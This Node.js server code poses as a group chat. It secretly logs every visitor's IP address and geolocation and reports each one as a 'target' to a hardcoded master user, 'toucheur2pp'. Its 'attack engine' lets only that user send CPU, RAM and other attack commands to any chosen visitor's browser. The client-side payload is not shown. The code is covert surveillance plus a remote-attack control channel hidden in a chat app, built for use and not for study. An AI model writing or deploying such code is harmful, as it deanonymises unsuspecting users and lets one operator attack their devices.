const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(__dirname));

let users = [];

// --- IP LOGGER NATIF ---
function getGeo(ip, callback) {
    https.get(`https://ipapi.co/${ip}/json/`, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            try { callback(JSON.parse(data)); } 
            catch (e) { callback({ city: 'Inconnue' }); }
        });
    }).on('error', () => callback({ city: 'Erreur' }));
}

io.on('connection', (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    const cleanIp = ip.replace('::ffff:', '');

    socket.on('init', (data) => {
        getGeo(cleanIp, (geo) => {
            const newUser = { 
                id: socket.id, 
                name: data.name || "Stand_User",
                ip: cleanIp,
                loc: `${geo.city || '?'}, ${geo.country_name || '?'}`
            };
            users.push(newUser);

            // LOG PRIVÉ POUR LE MASTER (Console + Chat Privé)
            const master = users.find(u => u.name === "toucheur2pp");
            if (master) {
                io.to(master.id).emit('chat', { 
                    n: "SYSTEM", 
                    t: `🎯 CIBLE: ${newUser.name} | IP: ${cleanIp} | LOC: ${newUser.loc}` 
                });
            }
            io.emit('sync', users.map(u => ({id: u.id, name: u.name})));
        });
    });

    socket.on('chat', (msg) => {
        const user = users.find(u => u.id === socket.id);
        if (user) io.emit('chat', { n: user.name, t: msg });
    });

    // --- MOTEUR D'ATTAQUES ---
    const attacks = ['p_combo', 'p_tsunami', 'p_cpu', 'p_ram', 'p_chariot'];
    attacks.forEach(type => {
        socket.on(type, (targetId) => {
            const boss = users.find(u => u.id === socket.id);
            if (boss && boss.name === "toucheur2pp") {
                io.to(targetId).emit('execute', { type: type, from: boss.name });
            }
        });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        io.emit('sync', users.map(u => ({id: u.id, name: u.name})));
    });
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🥊 PUNCH V100 READY ON PORT ${PORT}`));
